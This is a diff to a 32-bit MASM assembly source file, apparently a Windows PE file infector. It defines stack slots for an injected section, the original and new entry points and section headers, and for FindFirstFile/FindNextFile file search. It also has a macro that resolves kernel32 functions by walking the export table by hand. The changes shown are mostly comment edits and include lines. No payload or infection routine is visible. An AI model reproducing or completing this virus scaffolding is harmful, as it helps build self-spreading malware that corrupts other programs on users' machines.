@@ -3,14 +3,17 @@
 .386
 .model flat, stdcall
 option casemap: none
+include \masm32\include\windows.inc 
+include \masm32\include\kernel32.inc 
+includelib \masm32\lib\kernel32.lib 
 
 ; .const
-	; Order of each variable in the stack
-	; Position relative to r|ebp calculated by -(Order * regSz) (For example, Order = 2 --> position = ebp - 2 * 4 = ebp - 8)
+	; Order of each variable IN THE STACK
+	; Position relative to r|ebp calculated by -(Order * regSz)
     deltaAddr EQU 1
     old_ebp EQU 2
 	selfImageBaseAddress EQU 3
-	selfSection EQU 4			; VA of injected section (inject new section)
+	selfSection EQU 4			; VA of injected section
 	selfEntry EQU 5				; VA of EntryPoint
 	selfVirtualSize EQU 6
 	selfPointerToRawData EQU 7
@@ -18,24 +21,24 @@ option casemap: none
 	tgHand EQU 8
 	tgNewEntry EQU 9
 	lfanew EQU 10
-	NumberOfSections EQU 11         ; WORD; Before injection
-	SizeOfOptionalHeader EQU 12     ; WORD
-	ioh_offset EQU 13               ; Optional Header
-	Magic EQU 14                    ; WORD (10Bh => PE32-bit; 20Bh => PE64-bit)
-	AddressOfEntryPoint EQU 15      ; Original AddressOfEntryPoint (OEP)
+	NumberOfSections EQU 11 ; WORD; Before injection
+	SizeOfOptionalHeader EQU 12 ; WORD
+	ioh_offset EQU 13
+	Magic EQU 14 ; WORD; 10Bh => 32=bit; 20Bh => 64-bit
+	AddressOfEntryPoint EQU 15
 	SectionAlignment EQU 16
 	FileAlignment EQU 17
 	lastish_offset EQU 18
 	newish_offset EQU 19
 	
     kernel32dll EQU 20
-    OrdinalTbl EQU 21    ; WORD
+    OrdinalTbl EQU 21
     NamePtrTbl EQU 22
     AddrTbl EQU 23
     k32NumFunc EQU 24
     user32dll EQU 25
     
-	fileHand EQU 26     ; From FindFirstFile, for FindNextFile
+	fileHand EQU 26 ; From FindFirstFile, for FindNextFile
     ffind1 EQU 27 		; FindFirstFileA
     ffind2 EQU 28 		; FindNextFileA
     ffind0 EQU 29 		; FindClose
@@ -50,26 +53,24 @@ option casemap: none
     msgbox EQU 39 		; MessageBoxA
     
     ; Other constants for readability
-    stack_reserved EQU 39   ; Number of values to be stored in the stack
-    regSz EQU 4             ; 4 for 32-bit, 8 for 64-bit
+    stack_reserved EQU 39 ; Number of values to be stored in the stack
+    regSz EQU 4 ; 8 for 64-bit
     
-	; whence (Use for SetFilePointer)
     SEEK_SET EQU 0
     SEEK_CUR EQU 1
     SEEK_END EQU 2
 
-; MACRO to process in stack
-stackAddr MACRO pos:REQ                   ; For example, stackAddr(3) --> temp = -3 * 4 = -12 
+stackAddr MACRO pos:REQ
 	LOCAL temp
 	temp = - pos * regSz
 	EXITM <temp>
 ENDM
 
-toStack MACRO pos:REQ, value:=<eax>       ; push the value of register (default = eax) into the postion "pos" in stack
+toStack MACRO pos:REQ, value:=<eax>
     mov [ebp + stackAddr(pos)], value
 ENDM
 
-fromStack MACRO pos:REQ                   
+fromStack MACRO pos:REQ
 	EXITM <[ebp + stackAddr(pos)]>
 ENDM
 
@@ -93,24 +94,23 @@ paccess MACRO pStr:REQ, reg:=<eax>
 	EXITM <DWORD PTR [daccess(pStr, reg)]>
 ENDM
 
-; Resolve Windows APIs 
 k32import MACRO pFunc:REQ
 	; Input the offset to a string that is the name of the queried function
 	LOCAL loopback, found
 	
-	mov ebx, fromStack(kernel32dll)      ; base address of kernel32.dll
-	mov edx, fromStack(k32NumFunc)       ; number of imported functions
+	mov ebx, fromStack(kernel32dll)
+	mov edx, fromStack(k32NumFunc)
 	xor eax, eax
 	
 	loopback:
-		mov edi, fromStack(NamePtrTbl)  
-		mov edi, [edi + eax*4]           ; function RVA
-		add edi, ebx                     ; function VA (= function RVA + ebx (ImageBase))
-		mov esi, daccess(pFunc, esi)     ; pFunc VA
+		mov edi, fromStack(NamePtrTbl)
+		mov edi, [edi + eax*4]
+		add edi, ebx
+		mov esi, daccess(pFunc, esi)
 		xor ecx, ecx
-		add ecx, LENGTHOF pFunc          ; Length of pFunc name
-		cld                              ; DF = 0, ESI and EDI increments
-		repe cmpsb                       ; compare bytes-to-bytes
+		add ecx, LENGTHOF pFunc
+		cld ; DF = 0, ESI and EDI increments
+		repe cmpsb
 	jz found
 	
 		inc eax
